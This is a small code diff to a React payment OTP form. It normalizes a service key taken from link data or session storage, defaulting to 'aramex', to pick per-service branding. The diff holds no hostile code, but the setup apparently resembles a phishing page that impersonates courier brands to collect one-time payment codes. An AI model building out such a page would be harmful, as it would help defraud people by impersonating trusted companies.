@@ -2,7 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { getServiceBranding } from "@/lib/serviceLogos";
+import { getServiceBranding, normalizeServiceKey } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, ArrowLeft } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -24,8 +24,9 @@ const PaymentOTPForm = () => {
   const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const rawServiceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || rawServiceKey;
+  const serviceKey = normalizeServiceKey(rawServiceKey, serviceName);
   const branding = getServiceBranding(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
